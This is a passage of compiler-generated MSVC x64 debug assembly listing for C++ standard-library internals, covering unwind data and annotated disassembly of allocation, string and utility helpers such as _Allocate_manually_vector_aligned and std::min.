$unwind$?assign@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV12@QEB_W@Z DD 025051801H
	DD	01132318H
	DD	0700c001dH
	DD	0500bH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?assign@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV12@QEB_W_K@Z DD 025051d01H
	DD	0118231dH
	DD	070110029H
	DD	05010H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??4?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV01@QEB_W@Z DD 025051801H
	DD	01132318H
	DD	0700c001dH
	DD	0500bH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?_Construct_empty@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXXZ DD 025051301H
	DD	010e2313H
	DD	070070025H
	DD	05006H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?_Deallocate_for_capacity@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@CAXAEAV?$allocator@_W@2@QEA_W_K@Z DD 025051d01H
	DD	0118231dH
	DD	07011001dH
	DD	05010H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??0?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@XZ DD 025051301H
	DD	010e2313H
	DD	070070021H
	DD	05006H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??0_Bxty@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAA@XZ DD 025051301H
	DD	010e2313H
	DD	07007001dH
	DD	05006H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?_Activate_SSO_buffer@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAAXXZ DD 025051301H
	DD	010e2313H
	DD	07007001dH
	DD	05006H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?_Large_mode_engaged@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEBA_NXZ DD 025051301H
	DD	010e2313H
	DD	07007001fH
	DD	05006H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?_Myptr@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEBAPEB_WXZ DD 025051301H
	DD	010e2313H
	DD	070070021H
	DD	05006H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?_Myptr@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAAPEA_WXZ DD 025051301H
	DD	010e2313H
	DD	070070021H
	DD	05006H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??0?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAA@XZ DD 025051301H
	DD	010e2313H
	DD	07007001dH
	DD	05006H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?max_size@?$_Default_allocator_traits@V?$allocator@_W@std@@@std@@SA_KAEBV?$allocator@_W@2@@Z DD 025051301H
	DD	010e2313H
	DD	07007001dH
	DD	05006H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?allocate@?$allocator@_W@std@@QEAAPEA_W_K@Z DD 025051801H
	DD	01132318H
	DD	0700c001dH
	DD	0500bH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?deallocate@?$allocator@_W@std@@QEAAXQEA_W_K@Z DD 025051d01H
	DD	0118231dH
	DD	07011001dH
	DD	05010H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??0?$allocator@_W@std@@QEAA@XZ DD 025051301H
	DD	010e2313H
	DD	07007001dH
	DD	05006H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?_Xlen_string@std@@YAXXZ DD 025050f01H
	DD	010a230fH
	DD	07003001dH
	DD	05002H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?assign@?$_WChar_traits@_W@std@@SAXAEA_WAEB_W@Z DD 025051801H
	DD	01132318H
	DD	0700c001dH
	DD	0500bH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?length@?$_WChar_traits@_W@std@@SA_KPEB_W@Z DD 025051301H
	DD	010e2313H
	DD	07007001dH
	DD	05006H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?move@?$_Char_traits@_WG@std@@SAPEA_WQEA_WQEB_W_K@Z DD 025051d01H
	DD	0118231dH
	DD	07011001dH
	DD	05010H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?copy@?$_Char_traits@_WG@std@@SAPEA_WQEA_WQEB_W_K@Z DD 025051d01H
	DD	0118231dH
	DD	07011001dH
	DD	05010H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?_Alloc_proxy@_Container_base0@std@@QEAAXAEBU_Fake_allocator@2@@Z DD 025051801H
	DD	01132318H
	DD	0700c001dH
	DD	0500bH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?_Orphan_all@_Container_base0@std@@QEAAXXZ DD 025051301H
	DD	010e2313H
	DD	07007001dH
	DD	05006H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?_Adjust_manually_vector_aligned@std@@YAXAEAPEAXAEA_K@Z DD 025051801H
	DD	01132318H
	DD	0700c002dH
	DD	0500bH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?_Allocate@_Default_allocate_traits@std@@SAPEAX_K@Z DD 025051301H
	DD	010e2313H
	DD	07007001dH
	DD	05006H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?_Throw_bad_array_new_length@std@@YAXXZ DD 025050f01H
	DD	010a230fH
	DD	070030023H
	DD	05002H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??_Gbad_array_new_length@std@@UEAAPEAXI@Z DD 025051701H
	DD	01122317H
	DD	0700b001dH
	DD	0500aH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??0bad_array_new_length@std@@QEAA@AEBV01@@Z DD 025051801H
	DD	01132318H
	DD	0700c001dH
	DD	0500bH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??1bad_array_new_length@std@@UEAA@XZ DD 025051301H
	DD	010e2313H
	DD	07007001dH
	DD	05006H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??0bad_array_new_length@std@@QEAA@XZ DD 025051301H
	DD	010e2313H
	DD	07007001dH
	DD	05006H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??_Gbad_alloc@std@@UEAAPEAXI@Z DD 025051701H
	DD	01122317H
	DD	0700b001dH
	DD	0500aH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??0bad_alloc@std@@QEAA@AEBV01@@Z DD 025051801H
	DD	01132318H
	DD	0700c001dH
	DD	0500bH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??1bad_alloc@std@@UEAA@XZ DD 025051301H
	DD	010e2313H
	DD	07007001dH
	DD	05006H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??0bad_alloc@std@@AEAA@QEBD@Z DD 025051801H
	DD	01132318H
	DD	0700c001dH
	DD	0500bH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??_Gexception@std@@UEAAPEAXI@Z DD 025051701H
	DD	01122317H
	DD	0700b001dH
	DD	0500aH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?what@exception@std@@UEBAPEBDXZ DD 025051301H
	DD	010e2313H
	DD	07007001fH
	DD	05006H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??1exception@std@@UEAA@XZ DD 025051301H
	DD	010e2313H
	DD	07007001dH
	DD	05006H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??0exception@std@@QEAA@AEBV01@@Z DD 025051801H
	DD	01132318H
	DD	0700c001dH
	DD	0500bH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??0exception@std@@QEAA@QEBDH@Z DD 025051d01H
	DD	0118231dH
	DD	07011001dH
	DD	05010H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?max@?$numeric_limits@_J@std@@SA_JXZ DD 025050f01H
	DD	010a230fH
	DD	07003001dH
	DD	05002H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??2@YAPEAX_KPEAX@Z DD 025051801H
	DD	01132318H
	DD	0700c001dH
	DD	0500bH
xdata	ENDS
; Function compile flags: /Odt
;	COMDAT __JustMyCode_Default
_TEXT	SEGMENT
__JustMyCode_Default PROC				; COMDAT
  00000	c2 00 00	 ret	 0
__JustMyCode_Default ENDP
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory
;	COMDAT ??$_Allocate_manually_vector_aligned@U_Default_allocate_traits@std@@@std@@YAPEAX_K@Z
_TEXT	SEGMENT
_Block_size$ = 8
_Ptr_container$ = 40
_Ptr$ = 72
_Bytes$ = 320
??$_Allocate_manually_vector_aligned@U_Default_allocate_traits@std@@@std@@YAPEAX_K@Z PROC ; std::_Allocate_manually_vector_aligned<std::_Default_allocate_traits>, COMDAT

; 140  : __declspec(allocator) void* _Allocate_manually_vector_aligned(const size_t _Bytes) {

$LN12:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec 48 01
	00 00		 sub	 rsp, 328		; 00000148H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__45A7EC28_xmemory
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 141  :     // allocate _Bytes manually aligned to at least _Big_allocation_alignment
; 142  :     const size_t _Block_size = _Non_user_size + _Bytes;

  0001f	48 8b 85 40 01
	00 00		 mov	 rax, QWORD PTR _Bytes$[rbp]
  00026	48 83 c0 27	 add	 rax, 39			; 00000027H
  0002a	48 89 45 08	 mov	 QWORD PTR _Block_size$[rbp], rax

; 143  :     if (_Block_size <= _Bytes) {

  0002e	48 8b 85 40 01
	00 00		 mov	 rax, QWORD PTR _Bytes$[rbp]
  00035	48 39 45 08	 cmp	 QWORD PTR _Block_size$[rbp], rax
  00039	77 05		 ja	 SHORT $LN8@Allocate_m

; 144  :         _Throw_bad_array_new_length(); // add overflow

  0003b	e8 00 00 00 00	 call	 ?_Throw_bad_array_new_length@std@@YAXXZ ; std::_Throw_bad_array_new_length
$LN8@Allocate_m:

; 145  :     }
; 146  : 
; 147  :     const uintptr_t _Ptr_container = reinterpret_cast<uintptr_t>(_Traits::_Allocate(_Block_size));

  00040	48 8b 4d 08	 mov	 rcx, QWORD PTR _Block_size$[rbp]
  00044	e8 00 00 00 00	 call	 ?_Allocate@_Default_allocate_traits@std@@SAPEAX_K@Z ; std::_Default_allocate_traits::_Allocate
  00049	48 89 45 28	 mov	 QWORD PTR _Ptr_container$[rbp], rax
$LN4@Allocate_m:

; 148  :     _STL_VERIFY(_Ptr_container != 0, "invalid argument"); // validate even in release since we're doing p[-1]

  0004d	48 83 7d 28 00	 cmp	 QWORD PTR _Ptr_container$[rbp], 0
  00052	74 02		 je	 SHORT $LN9@Allocate_m
  00054	eb 0b		 jmp	 SHORT $LN10@Allocate_m
$LN9@Allocate_m:
$LN7@Allocate_m:
  00056	e8 00 00 00 00	 call	 _invalid_parameter_noinfo_noreturn
  0005b	33 c0		 xor	 eax, eax
  0005d	85 c0		 test	 eax, eax
  0005f	75 f5		 jne	 SHORT $LN7@Allocate_m
$LN10@Allocate_m:
  00061	33 c0		 xor	 eax, eax
  00063	85 c0		 test	 eax, eax
  00065	75 e6		 jne	 SHORT $LN4@Allocate_m

; 149  :     void* const _Ptr = reinterpret_cast<void*>((_Ptr_container + _Non_user_size) & ~(_Big_allocation_alignment - 1));

  00067	48 8b 45 28	 mov	 rax, QWORD PTR _Ptr_container$[rbp]
  0006b	48 83 c0 27	 add	 rax, 39			; 00000027H
  0006f	48 83 e0 e0	 and	 rax, -32		; ffffffffffffffe0H
  00073	48 89 45 48	 mov	 QWORD PTR _Ptr$[rbp], rax

; 150  :     static_cast<uintptr_t*>(_Ptr)[-1] = _Ptr_container;

  00077	b8 08 00 00 00	 mov	 eax, 8
  0007c	48 6b c0 ff	 imul	 rax, rax, -1
  00080	48 8b 4d 48	 mov	 rcx, QWORD PTR _Ptr$[rbp]
  00084	48 8b 55 28	 mov	 rdx, QWORD PTR _Ptr_container$[rbp]
  00088	48 89 14 01	 mov	 QWORD PTR [rcx+rax], rdx

; 151  : 
; 152  : #ifdef _DEBUG
; 153  :     static_cast<uintptr_t*>(_Ptr)[-2] = _Big_allocation_sentinel;
; 154  : #endif // defined(_DEBUG)
; 155  :     return _Ptr;

  0008c	48 8b 45 48	 mov	 rax, QWORD PTR _Ptr$[rbp]
$LN11@Allocate_m:

; 156  : }

  00090	48 8d a5 28 01
	00 00		 lea	 rsp, QWORD PTR [rbp+296]
  00097	5f		 pop	 rdi
  00098	5d		 pop	 rbp
  00099	c3		 ret	 0
??$_Allocate_manually_vector_aligned@U_Default_allocate_traits@std@@@std@@YAPEAX_K@Z ENDP ; std::_Allocate_manually_vector_aligned<std::_Default_allocate_traits>
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory
;	COMDAT ??$_Get_size_of_n@$01@std@@YA_K_K@Z
_TEXT	SEGMENT
_Overflow_is_possible$ = 4
_Max_possible$1 = 40
_Count$ = 288
??$_Get_size_of_n@$01@std@@YA_K_K@Z PROC		; std::_Get_size_of_n<2>, COMDAT

; 68   : _NODISCARD constexpr size_t _Get_size_of_n(const size_t _Count) {

$LN4:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec 28 01
	00 00		 sub	 rsp, 296		; 00000128H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__45A7EC28_xmemory
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 69   :     constexpr bool _Overflow_is_possible = _Ty_size > 1;

  0001f	c6 45 04 01	 mov	 BYTE PTR _Overflow_is_possible$[rbp], 1

; 70   : 
; 71   :     if constexpr (_Overflow_is_possible) {
; 72   :         constexpr size_t _Max_possible = static_cast<size_t>(-1) / _Ty_size;

  00023	48 b8 ff ff ff
	ff ff ff ff 7f	 mov	 rax, 9223372036854775807 ; 7fffffffffffffffH
  0002d	48 89 45 28	 mov	 QWORD PTR _Max_possible$1[rbp], rax

; 73   :         if (_Count > _Max_possible) {

  00031	48 b8 ff ff ff
	ff ff ff ff 7f	 mov	 rax, 9223372036854775807 ; 7fffffffffffffffH
  0003b	48 39 85 20 01
	00 00		 cmp	 QWORD PTR _Count$[rbp], rax
  00042	76 05		 jbe	 SHORT $LN2@Get_size_o

; 74   :             _Throw_bad_array_new_length(); // multiply overflow

  00044	e8 00 00 00 00	 call	 ?_Throw_bad_array_new_length@std@@YAXXZ ; std::_Throw_bad_array_new_length
$LN2@Get_size_o:

; 75   :         }
; 76   :     }
; 77   : 
; 78   :     return _Count * _Ty_size;

  00049	48 8b 85 20 01
	00 00		 mov	 rax, QWORD PTR _Count$[rbp]
  00050	48 d1 e0	 shl	 rax, 1
$LN3@Get_size_o:

; 79   : }

  00053	48 8d a5 08 01
	00 00		 lea	 rsp, QWORD PTR [rbp+264]
  0005a	5f		 pop	 rdi
  0005b	5d		 pop	 rbp
  0005c	c3		 ret	 0
??$_Get_size_of_n@$01@std@@YA_K_K@Z ENDP		; std::_Get_size_of_n<2>
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory
;	COMDAT ??$_Allocate@$0BA@U_Default_allocate_traits@std@@$0A@@std@@YAPEAX_K@Z
_TEXT	SEGMENT
_Bytes$ = 224
??$_Allocate@$0BA@U_Default_allocate_traits@std@@$0A@@std@@YAPEAX_K@Z PROC ; std::_Allocate<16,std::_Default_allocate_traits,0>, COMDAT

; 234  : __declspec(allocator) _CONSTEXPR20 void* _Allocate(const size_t _Bytes) {

$LN5:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__45A7EC28_xmemory
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 235  :     // allocate _Bytes when !_HAS_ALIGNED_NEW || _Align <= __STDCPP_DEFAULT_NEW_ALIGNMENT__
; 236  : #if defined(_M_IX86) || defined(_M_X64)
; 237  : #if _HAS_CXX20 // TRANSITION, GH-1532
; 238  :     if (!_STD is_constant_evaluated())
; 239  : #endif // _HAS_CXX20
; 240  :     {
; 241  :         if (_Bytes >= _Big_allocation_threshold) { // boost the alignment of big allocations to help autovectorization

  0001f	48 81 bd e0 00
	00 00 00 10 00
	00		 cmp	 QWORD PTR _Bytes$[rbp], 4096 ; 00001000H
  0002a	72 0e		 jb	 SHORT $LN2@Allocate

; 242  :             return _Allocate_manually_vector_aligned<_Traits>(_Bytes);

  0002c	48 8b 8d e0 00
	00 00		 mov	 rcx, QWORD PTR _Bytes$[rbp]
  00033	e8 00 00 00 00	 call	 ??$_Allocate_manually_vector_aligned@U_Default_allocate_traits@std@@@std@@YAPEAX_K@Z ; std::_Allocate_manually_vector_aligned<std::_Default_allocate_traits>
  00038	eb 1a		 jmp	 SHORT $LN1@Allocate
$LN2@Allocate:

; 243  :         }
; 244  :     }
; 245  : #endif // defined(_M_IX86) || defined(_M_X64)
; 246  : 
; 247  :     if (_Bytes != 0) {

  0003a	48 83 bd e0 00
	00 00 00	 cmp	 QWORD PTR _Bytes$[rbp], 0
  00042	74 0e		 je	 SHORT $LN3@Allocate

; 248  :         return _Traits::_Allocate(_Bytes);

  00044	48 8b 8d e0 00
	00 00		 mov	 rcx, QWORD PTR _Bytes$[rbp]
  0004b	e8 00 00 00 00	 call	 ?_Allocate@_Default_allocate_traits@std@@SAPEAX_K@Z ; std::_Default_allocate_traits::_Allocate
  00050	eb 02		 jmp	 SHORT $LN1@Allocate
$LN3@Allocate:

; 249  :     }
; 250  : 
; 251  :     return nullptr;

  00052	33 c0		 xor	 eax, eax
$LN1@Allocate:

; 252  : }

  00054	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  0005b	5f		 pop	 rdi
  0005c	5d		 pop	 rbp
  0005d	c3		 ret	 0
??$_Allocate@$0BA@U_Default_allocate_traits@std@@$0A@@std@@YAPEAX_K@Z ENDP ; std::_Allocate<16,std::_Default_allocate_traits,0>
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory
;	COMDAT ??$_Allocate_at_least_helper@V?$allocator@_W@std@@@std@@YAPEA_WAEAV?$allocator@_W@0@AEA_K@Z
_TEXT	SEGMENT
_Al$ = 224
_Count$ = 232
??$_Allocate_at_least_helper@V?$allocator@_W@std@@@std@@YAPEA_WAEAV?$allocator@_W@0@AEA_K@Z PROC ; std::_Allocate_at_least_helper<std::allocator<wchar_t> >, COMDAT

; 2202 :     _Alloc& _Al, _CRT_GUARDOVERFLOW typename allocator_traits<_Alloc>::size_type& _Count) {

$LN3:
  00000	48 89 54 24 10	 mov	 QWORD PTR [rsp+16], rdx
  00005	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  0000a	55		 push	 rbp
  0000b	57		 push	 rdi
  0000c	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  00013	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00018	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__45A7EC28_xmemory
  0001f	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 2203 : #if _HAS_CXX23
; 2204 :     if constexpr (_Should_allocate_at_least<_Alloc>) {
; 2205 :         auto [_Ptr, _Allocated] = _Al.allocate_at_least(_Count);
; 2206 :         _Count                  = _Allocated;
; 2207 :         return _Ptr;
; 2208 :     } else
; 2209 : #endif // _HAS_CXX23
; 2210 :     {
; 2211 :         return _Al.allocate(_Count);

  00024	48 8b 85 e8 00
	00 00		 mov	 rax, QWORD PTR _Count$[rbp]
  0002b	48 8b 10	 mov	 rdx, QWORD PTR [rax]
  0002e	48 8b 8d e0 00
	00 00		 mov	 rcx, QWORD PTR _Al$[rbp]
  00035	e8 00 00 00 00	 call	 ?allocate@?$allocator@_W@std@@QEAAPEA_W_K@Z ; std::allocator<wchar_t>::allocate

; 2212 :     }
; 2213 : }

  0003a	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00041	5f		 pop	 rdi
  00042	5d		 pop	 rbp
  00043	c3		 ret	 0
??$_Allocate_at_least_helper@V?$allocator@_W@std@@@std@@YAPEA_WAEAV?$allocator@_W@0@AEA_K@Z ENDP ; std::_Allocate_at_least_helper<std::allocator<wchar_t> >
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\utility
;	COMDAT ??$min@_K@std@@YAAEB_KAEB_K0@Z
_TEXT	SEGMENT
$T1 = 200
tv65 = 216
_Left$ = 256
_Right$ = 264
??$min@_K@std@@YAAEB_KAEB_K0@Z PROC			; std::min<unsigned __int64>, COMDAT

; 98   :     (min) (const _Ty& _Left, const _Ty& _Right) noexcept(noexcept(_Right < _Left)) /* strengthened */ {

$LN5:
  00000	48 89 54 24 10	 mov	 QWORD PTR [rsp+16], rdx
  00005	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  0000a	55		 push	 rbp
  0000b	57		 push	 rdi
  0000c	48 81 ec 08 01
	00 00		 sub	 rsp, 264		; 00000108H
  00013	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00018	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__2F328FEB_utility
  0001f	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 99   :     // return smaller of _Left and _Right
; 100  :     return _Right < _Left ? _Right : _Left;

  00024	48 8b 85 08 01
	00 00		 mov	 rax, QWORD PTR _Right$[rbp]
  0002b	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR _Left$[rbp]
  00032	48 8b 09	 mov	 rcx, QWORD PTR [rcx]
  00035	48 39 08	 cmp	 QWORD PTR [rax], rcx
  00038	73 10		 jae	 SHORT $LN3@min
  0003a	48 8b 85 08 01
	00 00		 mov	 rax, QWORD PTR _Right$[rbp]
  00041	48 89 85 d8 00
	00 00		 mov	 QWORD PTR tv65[rbp], rax
  00048	eb 0e		 jmp	 SHORT $LN4@min
$LN3@min:
  0004a	48 8b 85 00 01
	00 00		 mov	 rax, QWORD PTR _Left$[rbp]
  00051	48 89 85 d8 00
	00 00		 mov	 QWORD PTR tv65[rbp], rax
$LN4@min:
  00058	48 8b 85 d8 00
	00 00		 mov	 rax, QWORD PTR tv65[rbp]
  0005f	48 89 85 c8 00
	00 00		 mov	 QWORD PTR $T1[rbp], rax
  00066	48 8b 85 c8 00
	00 00		 mov	 rax, QWORD PTR $T1[rbp]

; 101  : }

  0006d	48 8d a5 e8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+232]
  00074	5f		 pop	 rdi
  00075	5d		 pop	 rbp
  00076	c3		 ret	 0
??$min@_K@std@@YAAEB_KAEB_K0@Z ENDP			; std::min<unsigned __int64>
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\type_traits
;	COMDAT ??$addressof@PEA_W@std@@YAPEAPEA_WAEAPEA_W@Z
_TEXT	SEGMENT
_Val$ = 224
??$addressof@PEA_W@std@@YAPEAPEA_WAEAPEA_W@Z PROC	; std::addressof<wchar_t *>, COMDAT

; 1583 : _NODISCARD constexpr _Ty* addressof(_Ty& _Val) noexcept {

$LN3:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__7C4A1519_type_traits
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 1584 :     return __builtin_addressof(_Val);

  0001f	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR _Val$[rbp]

; 1585 : }

  00026	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  0002d	5f		 pop	 rdi
  0002e	5d		 pop	 rbp
  0002f	c3		 ret	 0
??$addressof@PEA_W@std@@YAPEAPEA_WAEAPEA_W@Z ENDP	; std::addressof<wchar_t *>
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xutility
;	COMDAT ??$_Construct_in_place@PEA_WAEBQEA_W@std@@YAXAEAPEA_WAEBQEA_W@Z
_TEXT	SEGMENT
$T1 = 200
_Obj$ = 256
<_Args_0>$ = 264
??$_Construct_in_place@PEA_WAEBQEA_W@std@@YAXAEAPEA_WAEBQEA_W@Z PROC ; std::_Construct_in_place<wchar_t *,wchar_t * const &>, COMDAT

; 248  :     is_nothrow_constructible_v<_Ty, _Types...>) {

$LN3:
  00000	48 89 54 24 10	 mov	 QWORD PTR [rsp+16], rdx
  00005	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  0000a	55		 push	 rbp
  0000b	57		 push	 rdi
  0000c	48 81 ec 08 01
	00 00		 sub	 rsp, 264		; 00000108H
  00013	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00018	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__C27AFEEB_xutility
  0001f	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 249  : #if _HAS_CXX20
; 250  :     if (_STD is_constant_evaluated()) {
; 251  :         _STD construct_at(_STD addressof(_Obj), _STD forward<_Types>(_Args)...);
; 252  :     } else
; 253  : #endif // _HAS_CXX20
; 254  :     {
; 255  :         ::new (static_cast<void*>(_STD addressof(_Obj))) _Ty(_STD forward<_Types>(_Args)...);

  00024	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR _Obj$[rbp]
  0002b	e8 00 00 00 00	 call	 ??$addressof@PEA_W@std@@YAPEAPEA_WAEAPEA_W@Z ; std::addressof<wchar_t *>
  00030	48 8b d0	 mov	 rdx, rax
  00033	b9 08 00 00 00	 mov	 ecx, 8
  00038	e8 00 00 00 00	 call	 ??2@YAPEAX_KPEAX@Z	; operator new
  0003d	48 89 85 c8 00
	00 00		 mov	 QWORD PTR $T1[rbp], rax
  00044	48 8b 85 c8 00
	00 00		 mov	 rax, QWORD PTR $T1[rbp]
  0004b	48 8b 8d 08 01
	00 00		 mov	 rcx, QWORD PTR <_Args_0>$[rbp]
  00052	48 8b 09	 mov	 rcx, QWORD PTR [rcx]
  00055	48 89 08	 mov	 QWORD PTR [rax], rcx

; 256  :     }
; 257  : }

  00058	48 8d a5 e8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+232]
  0005f	5f		 pop	 rdi
  00060	5d		 pop	 rbp
  00061	c3		 ret	 0
??$_Construct_in_place@PEA_WAEBQEA_W@std@@YAXAEAPEA_WAEBQEA_W@Z ENDP ; std::_Construct_in_place<wchar_t *,wchar_t * const &>
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ??$_Allocate_for_capacity@$0A@@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@CAPEA_WAEAV?$allocator@_W@1@AEA_K@Z
_TEXT	SEGMENT
_Fancy_ptr$ = 8
_Al$ = 256
_Capacity$ = 264
??$_Allocate_for_capacity@$0A@@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@CAPEA_WAEAV?$allocator@_W@1@AEA_K@Z PROC ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Allocate_for_capacity<0>, COMDAT

; 2611 :     _NODISCARD static _CONSTEXPR20 pointer _Allocate_for_capacity(_Alty& _Al, size_type& _Capacity) {

$LN3:
  00000	48 89 54 24 10	 mov	 QWORD PTR [rsp+16], rdx
  00005	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
